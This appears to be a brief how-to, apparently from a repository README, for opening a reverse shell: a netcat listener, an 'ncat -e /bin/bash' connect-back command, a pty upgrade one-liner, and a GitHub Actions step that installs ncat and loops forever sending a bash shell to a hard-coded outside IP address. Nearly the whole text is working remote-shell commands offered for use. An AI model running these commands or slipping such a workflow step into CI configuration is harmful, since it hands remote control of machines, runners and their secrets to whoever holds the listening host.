# How?
- in controller server
```sh
nc -nlvp 8888
```
- in target server
```sh
ncat -e /bin/bash 127.0.0.1 8888
```
- for better terminal run
```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

# GHA
```yaml
- name: reverse-shell
  shell: bash
  run: |
    sudo apt-get update -y
    sudo apt-get install -y ncat
    set +e
    while true; do ncat -e /bin/bash 35.176.8.88 8888; sleep 2; echo 'reconnecting..'; done
```
